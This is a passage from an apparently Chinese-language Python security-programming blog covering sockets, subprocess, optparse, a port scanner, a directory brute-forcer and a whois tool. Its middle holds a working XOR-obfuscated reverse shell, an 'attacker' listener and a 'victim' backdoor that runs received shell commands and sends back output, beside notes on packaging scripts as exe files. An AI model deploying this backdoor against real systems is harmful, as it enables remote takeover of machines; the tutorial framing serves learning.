<h3 id="sendall"><a href="#sendall" class="headerlink" title="sendall()"></a>sendall()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.sendall(string)</span><br></pre></td></tr></table></figure>
<p>将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。<br>内部通过递归调用send，将所有内容发送出去。</p>
<h3 id="sendto"><a href="#sendto" class="headerlink" title="sendto()"></a>sendto()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.sendto(string,address)</span><br></pre></td></tr></table></figure>
<p>将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。该函数主要用于UDP协议。</p>
<h3 id="connect"><a href="#connect" class="headerlink" title="connect()"></a>connect()</h3><p>连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket.connect((host,port))</span><br></pre></td></tr></table></figure>
<h3 id="close"><a href="#close" class="headerlink" title="close()"></a>close()</h3><p>关闭socket</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.socket.close()</span><br></pre></td></tr></table></figure>
<h3 id="bind"><a href="#bind" class="headerlink" title="bind()"></a>bind()</h3><p>将套接字绑定到地址。在<code>AF_INET</code>，以元组(host,port)的形式表示地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.bind((&apos;host&apos;,port))</span><br></pre></td></tr></table></figure>
<h3 id="listen"><a href="#listen" class="headerlink" title="listen()"></a>listen()</h3><p>开始监听传入连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.listen(backlog)</span><br></pre></td></tr></table></figure>
<p>backlog指定在拒绝连接之前，可以挂起的最大连接数量。</p>
<h3 id="recv"><a href="#recv" class="headerlink" title="recv()"></a>recv()</h3><p>接收套接字的数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.recv(bufsize)</span><br></pre></td></tr></table></figure>
<p>数据以字符串形式返回，bufsize指定最多可以接收的数量。</p>
<h3 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom()"></a>recvfrom()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.recvfrom(bufsize)</span><br></pre></td></tr></table></figure>
<p>与recv()类似，但返回值是<code>(data,address)</code><br>data是包含接收数据的字符串，address是发送数据的套接字地址。</p>
<h3 id="SOCK-STREAM"><a href="#SOCK-STREAM" class="headerlink" title="SOCK_STREAM"></a>SOCK_STREAM</h3><p>1.数据流<br>2.一般是tcp/ip协议的编程<br>3.有保障的(即能保证数据正确传送到对方)面向连接的SOCKET，多用于资料(如文件)传送</p>
<h3 id="SOCK-DGRAM"><a href="#SOCK-DGRAM" class="headerlink" title="SOCK_DGRAM"></a>SOCK_DGRAM</h3><p>1.数据包<br>2.udp协议网络编程<br>3.是无保障的面向消息的socket ， 主要用于在网络上发广播信息。</p>
<h3 id="AF-INET"><a href="#AF-INET" class="headerlink" title="AF_INET"></a>AF_INET</h3><p>IPv4(默认)</p>
<h3 id="AF-INET6"><a href="#AF-INET6" class="headerlink" title="AF_INET6"></a>AF_INET6</h3><p>IPv6</p>
<h3 id="AF-UNIX"><a href="#AF-UNIX" class="headerlink" title="AF_UNIX"></a>AF_UNIX</h3><p>只能够用于单一的Unix系统进程间通信</p>
<h3 id="异常处理-1"><a href="#异常处理-1" class="headerlink" title="异常处理"></a>异常处理</h3><h4 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h4><p>由于逻辑或语法导致一个程序无法正常执行的问题</p>
<h4 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h4><p>程序出错时标识的一种状态</p>
<p>当异常发生时，程序不会再向下执行，而转去调用此函数的地方处理此函数并恢复到正常状态</p>
<h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    可以触发异常的语法</span><br><span class="line">except 错误类型1 [as 变量1]</span><br><span class="line">    异常处理语句1</span><br><span class="line">except 错误类型2 [as 变量2]：</span><br><span class="line">        异常处理语句2</span><br><span class="line">except (错误类型3， 错误类型4):</span><br><span class="line">    异常处理语句3</span><br><span class="line">...</span><br><span class="line">except：</span><br><span class="line">    异常处理语句other</span><br><span class="line">else：</span><br><span class="line">    未发生异常语句</span><br><span class="line">finally：</span><br><span class="line">    最终语句</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#scanport.py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">ports = [21,22,53,80,443,3306,3389]</span><br><span class="line">hosts = [&apos;127.0.0.1&apos;]</span><br><span class="line"></span><br><span class="line">for host in hosts:</span><br><span class="line">    for port in ports:</span><br><span class="line">        s = socket.socket()</span><br><span class="line">        print(&quot;[+] Attempting to connect to &quot;+ host + &quot;:&quot; +str(port))</span><br><span class="line">        s.connect((host,port))</span><br><span class="line">        banner = s.recv(1024)</span><br><span class="line">        s.send(&apos;Hello&apos;.encode())</span><br><span class="line">        if str(banner):</span><br><span class="line">            print(&quot;[+]&quot; + host + &quot;:&quot; + str(port) + &quot; open: \n&quot; + banner.decode())</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#udp_server.py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 12600</span><br><span class="line">buf_size =128</span><br><span class="line">addr = (host,port)</span><br><span class="line">udp_server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">udp_server.bind(addr)</span><br><span class="line">while True:</span><br><span class="line">    print (&apos;waiting for message...&apos;)</span><br><span class="line">    data,addr = udp_server.recvfrom(buf_size)</span><br><span class="line">    print (&apos;...received from and return to:&apos; + str(addr) + &quot;: &quot; + data.decode())</span><br><span class="line">udp_server.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#udp_client.py</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">host = &apos;127.0.0.1&apos;</span><br><span class="line">port = 12600</span><br><span class="line">buf_size = 128</span><br><span class="line">addr = (host,port)</span><br><span class="line">udp_client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">while True:</span><br><span class="line">    data = input(&apos;&gt;&apos;)</span><br><span class="line">    if not data:</span><br><span class="line">        break</span><br><span class="line">    udp_client.sendto(data.encode(&apos;utf-8&apos;),addr)</span><br><span class="line">    data,server_addr = udp_client.recvfrom(buf_size)</span><br><span class="line">    print (&apos;...received from:&apos; + str(addr) + &quot;: &quot; + data.decode())</span><br><span class="line">udp_client.close()</span><br></pre></td></tr></table></figure>
<h3 id="生成exe文件"><a href="#生成exe文件" class="headerlink" title="生成exe文件"></a>生成exe文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure>
<p>安装完成之后在<code>Python37/Script</code>文件夹下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -F</span><br></pre></td></tr></table></figure>
<h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p>从python2.4版本开始,可以用subprocess这个模块来产生子进程,并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。<br>subprocess意在替代其他几个老的模块或者函数，比如：<code>os.system os.spawn* os.popen* popen2.* commands.*</code></p>
<h3 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h3><p>subprocess模块定义了一个类： Popen</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen( args, </span><br><span class="line">      bufsize=0, </span><br><span class="line">      executable=None,</span><br><span class="line">      stdin=None,</span><br><span class="line">      stdout=None, </span><br><span class="line">      stderr=None, </span><br><span class="line">      preexec_fn=None, </span><br><span class="line">      close_fds=False, </span><br><span class="line">      shell=False, </span><br><span class="line">      cwd=None, </span><br><span class="line">      env=None, </span><br><span class="line">      universal_newlines=False, </span><br><span class="line">      startupinfo=None, </span><br><span class="line">      creationflags=0)</span><br></pre></td></tr></table></figure>
<p>各项参数含义</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">args</td>
<td style="text-align:center">字符串或列表</td>
</tr>
<tr>
<td style="text-align:center">bufsize</td>
<td style="text-align:center">0 无缓冲<br>1行缓冲<br>其他正值缓冲区大小<br>负值采用默认系统缓冲(一般是全缓冲)</td>
</tr>
<tr>
<td style="text-align:center">executable</td>
<td style="text-align:center">一般不用，args字符串或列表第一项表示程序名</td>
</tr>
<tr>
<td style="text-align:center">stdin<br>stdout<br>stderr</td>
<td style="text-align:center">None没有任何重定向，继承父进程<br>PIPE创建管道<br>文件对象<br>文件描述符(整数)<br>stderr还可以设置为STDOUT</td>
</tr>
<tr>
<td style="text-align:center">preexec_fn</td>
<td style="text-align:center">钩子函数，再fork和exec之间执行。(Unix)</td>
</tr>
<tr>
<td style="text-align:center">close_fds</td>
<td style="text-align:center">Unix下执行新进程前是否关闭0/1/2之外的文件<br>Windows下不继承还是继承父进程的文件描述符</td>
</tr>
<tr>
<td style="text-align:center">shell</td>
<td style="text-align:center">True<br>Unix下相当于args前面添加了<code>&quot;/bin/sh&quot; &quot;-c&quot;</code><br>Windows下相当于添加<code>&quot;cmd.exe /c&quot;</code></td>
</tr>
<tr>
<td style="text-align:center">cwd</td>
<td style="text-align:center">设置工作目录</td>
</tr>
<tr>
<td style="text-align:center">universal_newlines</td>
<td style="text-align:center">各种换行符统一处理为<code>\n</code></td>
</tr>
<tr>
<td style="text-align:center">startupinfo</td>
<td style="text-align:center">Windows下传递给CreateProcess的结构体</td>
</tr>
<tr>
<td style="text-align:center">creationflags</td>
<td style="text-align:center">Windows下，传递CREATE_NEW_CONSOLE创建自己的控制台窗口</td>
</tr>
</tbody>
</table>
<p>args:<br>args参数。可以是一个字符串，可以是一个包含程序参数的列表。要执行的程序一般就是这个列表的第一项，或者是字符串本身。<br><code>subprocess.Popen([&quot;cat&quot;,&quot;test.txt&quot;])</code><br><code>subprocess.Popen(&quot;cat test.txt&quot;)</code><br>这两个之中，后者将不会工作。因为如果是一个字符串的话，必须是程序的路径才可以。(考虑unix的api函数exec，接受的是字符串<br>列表)<br>但是下面的可以工作<br><code>subprocess.Popen(&quot;cat test.txt&quot;, shell=True)</code><br>这是因为它相当于<br><code>subprocess.Popen([&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat test.txt&quot;])</code><br>在*nix下，当shell=False（默认）时，Popen使用os.execvp()来执行子程序。args一般要是一个【列表】。如果args是个字符串的<br>话，会被当做是可执行文件的路径，这样就不能传入任何参数了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#shell.py 攻击者</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.bind((&apos;192.168.126.1&apos;,12600))</span><br><span class="line">s.listen(2048)</span><br><span class="line">print (&apos;Listening on port 12600... &apos;)</span><br><span class="line">(client,(ip,port)) = s.accept()</span><br><span class="line">print (f&apos;received connection from : &#123;ip&#125;&apos;)</span><br><span class="line">while True:</span><br><span class="line">    command = input(&apos;~$ &apos;)</span><br><span class="line">    # bytearray()需要将str进行编码再byte</span><br><span class="line">    encode = bytearray(command.encode(&apos;utf-8&apos;))</span><br><span class="line">    for i in range(len(encode)):</span><br><span class="line">        # XOR encode data</span><br><span class="line">        encode[i] ^= 0x41</span><br><span class="line">    client.send(encode)</span><br><span class="line">    en_data = client.recv(2048)</span><br><span class="line">    decode = bytearray(en_data)</span><br><span class="line">    for i in range(len(decode)):</span><br><span class="line">        decode[i] ^= 0x41</span><br><span class="line">    print (decode.decode())</span><br><span class="line">client.close()</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#backdoor.py 受害者</span><br><span class="line">import socket,subprocess,sys</span><br><span class="line">RHOST = sys.argv[1]</span><br><span class="line">RPORT = 12600</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((RHOST,RPORT))</span><br><span class="line">while True:</span><br><span class="line">    # receive XOR encoded data from network socket</span><br><span class="line">    data = s.recv(1024)</span><br><span class="line">    # XOR decoded</span><br><span class="line">    en_data = bytearray(data)</span><br><span class="line">    for i in range(len(en_data)):</span><br><span class="line">        en_data[i] ^= 0x41</span><br><span class="line">    # Execute the decoded data as a command</span><br><span class="line">    # The subprocess module is great because we can PIPE STDOUT/STDERR/STDIN to a variable</span><br><span class="line">    comm = subprocess.Popen(str(en_data),shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)</span><br><span class="line">    comm.wait()</span><br><span class="line">    STDOUT,STDERR = comm.communicate()</span><br><span class="line">    print (STDERR)</span><br><span class="line">    # Encode the output and send to RHOST</span><br><span class="line">    en_STDOUT = bytearray(STDOUT)</span><br><span class="line">    for i in range(len(en_STDOUT)):</span><br><span class="line">        en_STDOUT[i] ^= 0x41</span><br><span class="line">    s.send(en_STDOUT)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p><code>shell.py</code>运行</p>
<p><img src="/2019/05/17/Python-Notes/shell.png" alt></p>
<p><code>backdoor.py</code>运行</p>
<p><img src="/2019/05/17/Python-Notes/backdoor.png" alt></p>
<h2 id="optparse模块"><a href="#optparse模块" class="headerlink" title="optparse模块"></a>optparse模块</h2><h3 id="optparse-OptionParser"><a href="#optparse-OptionParser" class="headerlink" title="optparse.OptionParser()"></a>optparse.OptionParser()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parser = optparse.OptionParser(sys.argv[0] + &apos; &apos; + &apos;-i &lt;file_with URLs&gt; -r -s [optional]&apos;)</span><br></pre></td></tr></table></figure>
<p>未加参数时回显</p>
<p><img src="/2019/05/17/Python-Notes/optparse.OptionParser.png" alt></p>
<h3 id="optparse-add-option"><a href="#optparse-add-option" class="headerlink" title="optparse.add_option()"></a>optparse.add_option()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parser.add_option(&apos;-i&apos;,dest=&apos;domains&apos;,type=&apos;string&apos;,help=&apos;specify target file with URLs&apos;)</span><br><span class="line">parser.add_option(&apos;-r&apos;,dest=&apos;directorys&apos;,type=&apos;string&apos;,help=&apos;specify a file with directory to request&apos;)</span><br><span class="line">parser.add_option(&apos;-s&apos;,dest=&apos;search&apos;,type=&apos;string&apos;,help=&apos;[optional] Specify a search string -s&apos;)</span><br></pre></td></tr></table></figure>
<p><code>--help</code>显示参数</p>
<p><img src="/2019/05/17/Python-Notes/optparse.add_option.png" alt></p>
<h3 id="optparse-parse-args"><a href="#optparse-parse-args" class="headerlink" title="optparse.parse_args()"></a>optparse.parse_args()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(options,args) = parser.parse_args()</span><br></pre></td></tr></table></figure>
<p>返回两个值，<code>options</code>包含所有<code>options</code>的对象，参数作为对象的属性，<code>args</code>解析<code>options</code>后剩余参数的列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">domains = options.domains</span><br></pre></td></tr></table></figure>
<h3 id="optparse-attributes"><a href="#optparse-attributes" class="headerlink" title="optparse.attributes"></a>optparse.attributes</h3><h4 id="option-action"><a href="#option-action" class="headerlink" title="option.action"></a>option.action</h4><p>默认为<code>store</code></p>
<h4 id="option-type"><a href="#option-type" class="headerlink" title="option.type"></a>option.type</h4><p>默认为<code>string</code></p>
<h4 id="option-dest"><a href="#option-dest" class="headerlink" title="option.dest"></a>option.dest</h4><p>告诉optparse将参数写在哪里</p>
<h4 id="option-help"><a href="#option-help" class="headerlink" title="option.help"></a>option.help</h4><p><code>help</code>选项显示内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#fake_dirbuster.py</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import sys,optparse,socket</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Colors:</span><br><span class="line">    RED = &apos;\033[91m&apos;</span><br><span class="line">    GREEN = &apos;\033[92m&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def webreq(domain,directorys):</span><br><span class="line">    directory = []</span><br><span class="line">    with open(directorys,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">        for item in file.readlines():</span><br><span class="line">            directory.append(item.strip()) # 移除目录中的换行符</span><br><span class="line">    for item in directory:</span><br><span class="line">        url = domain + &quot;/&quot; + item # 拼接URL</span><br><span class="line">        html_requested = requests.get(url) # 请求URL</span><br><span class="line">        if search:</span><br><span class="line">            parsed = BeautifulSoup(html_requested.content,&apos;lxml&apos;) # Parse the output with BeautifulSoup</span><br><span class="line">            if search in str(parsed):</span><br><span class="line">                print (Colors.GREEN + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;] Found: &apos;&quot; + search + &quot;&apos; in output&quot;)</span><br><span class="line">        if html_requested.status_code == 404:</span><br><span class="line">            print (Colors.RED + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;]&quot;)</span><br><span class="line">        elif html_requested.status_code:</span><br><span class="line">            print (Colors.GREEN + &quot;[+] URL: &quot; + url + &quot; [&quot; + str(html_requested.status_code) + &quot;]&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(sys.argv[0] + &apos; &apos; + &apos;-i &lt;file_with URLs&gt; -r -s [optional]&apos;) # 无参数回显</span><br><span class="line">    parser.add_option(&apos;-i&apos;,dest=&apos;domains&apos;,type=&apos;string&apos;,help=&apos;specify target file with URLs&apos;) # 设置参数</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest=&apos;directorys&apos;,type=&apos;string&apos;,help=&apos;specify a file with directory to request&apos;)</span><br><span class="line">    parser.add_option(&apos;-s&apos;,dest=&apos;search&apos;,type=&apos;string&apos;,help=&apos;[optional] Specify a search string -s&apos;)</span><br><span class="line">    (options,_) = parser.parse_args()</span><br><span class="line">    domains = options.domains</span><br><span class="line">    directorys = options.directorys</span><br><span class="line">    global search</span><br><span class="line">    search = options.search</span><br><span class="line"></span><br><span class="line">    if (domains == None) and (directorys == None):</span><br><span class="line">        print (parser.usage)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    if domains:</span><br><span class="line">        for domain in open(domains,&apos;r&apos;):</span><br><span class="line">            webreq(domain,directorys)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="cymruwhois模块"><a href="#cymruwhois模块" class="headerlink" title="cymruwhois模块"></a>cymruwhois模块</h2><h3 id="Client"><a href="#Client" class="headerlink" title="Client()"></a>Client()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from cymruwhois import Client</span><br><span class="line">c = client()</span><br><span class="line">google = c.lookup(&apos;8.8.8.8&apos;)</span><br><span class="line">type(google)</span><br><span class="line">&lt;class &apos;cymruwhois.record&apos;&gt;</span><br><span class="line">google.owner</span><br><span class="line">google.ip</span><br><span class="line">google.cc</span><br><span class="line">google.asn</span><br><span class="line">google.prefix</span><br></pre></td></tr></table></figure>
<h3 id="Clien-lookupmany-dict"><a href="#Clien-lookupmany-dict" class="headerlink" title="Clien().lookupmany_dict()"></a>Clien().lookupmany_dict()</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#返回字典，索引为ip</span><br><span class="line">result = Client.lookupmany_dict(iplist)</span><br><span class="line">result[&apos;8.8.8.8&apos;].owner</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">#whois.py</span><br><span class="line">import sys,os,optparse</span><br><span class="line">from cymruwhois import Client</span><br><span class="line"></span><br><span class="line"># whois</span><br><span class="line">def look(iplist):</span><br><span class="line">    c = Client()</span><br><span class="line">    if ips:</span><br><span class="line">        result = c.lookupmany_dict(iplist) </span><br><span class="line">        head = &apos;%-20s  - %15s (%s) - %s&apos; % (&apos;net&apos;,&apos;ip&apos;,&apos;cc&apos;,&apos;owner&apos;)</span><br><span class="line">        print (head)</span><br><span class="line">        for ip in iplist:</span><br><span class="line">            # get network information</span><br><span class="line">            net = result[ip].prefix</span><br><span class="line">            owner = result[ip].owner</span><br><span class="line">            cc = result[ip].cc</span><br><span class="line">            info = &apos;%-20s  - %15s (%s) - %s&apos; % (net,ip,cc,owner)</span><br><span class="line">            print (info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># check to ensure file is existed and readable</span><br><span class="line">def checkFile(ips):</span><br><span class="line">    if not os.path.isfile(ips):</span><br><span class="line">        print (&apos;[-] &apos; + ips + &apos; does not exist.&apos;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    if not os.access(ips,os.R_OK):</span><br><span class="line">        print (&apos;[-]&apos; + ips + &apos; access denied&apos;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    print (&apos;[+] Querying from: &apos; + ips)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(sys.argv[0] + &apos; -r &lt;file_with IPs&gt; || -i &lt;IP&gt;&apos;)</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest = &apos;ips&apos;,type = &apos;string&apos;,help = &apos;specify target IP address&apos;)</span><br><span class="line">    parser.add_option(&apos;-i&apos;,dest = &apos;ip&apos;,type = &apos;string&apos;,help = &apos;specify a target IP address&apos;)</span><br><span class="line">    (options,__) = parser.parse_args()</span><br><span class="line">    ip = options.ip</span><br><span class="line">    global ips </span><br><span class="line">    ips = options.ips</span><br><span class="line">    if (ips == None) and (ip == None):</span><br><span class="line">        print (parser.usage)</span><br><span class="line">        sys.exit(0)</span><br><span class="line">    if ips:</span><br><span class="line">        checkFile(ips)</span><br><span class="line">        iplist = []</span><br><span class="line">        with open (ips,&apos;r&apos;,encoding=&apos;utf-8&apos;) as file:</span><br><span class="line">            for line in file.readlines():</span><br><span class="line">                iplist.append(line.strip())</span><br><span class="line">        look(iplist)</span><br><span class="line">    else:</span><br><span class="line">        result = Client().lookup(ip)</span><br><span class="line">        net = result.prefix</span><br><span class="line">        owner = result.owner</span><br><span class="line">        cc = result.cc</span><br><span class="line">        info = &apos;%-20s  - %15s (%s) - %s&apos; % (net,ip,cc,owner)</span><br><span class="line">        head = &apos;%-20s  - %15s (%s) - %s&apos; % (&apos;net&apos;,&apos;ip&apos;,&apos;cc&apos;,&apos;owner&apos;)</span><br><span class="line">        print (head)</span><br><span class="line">        print (info)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    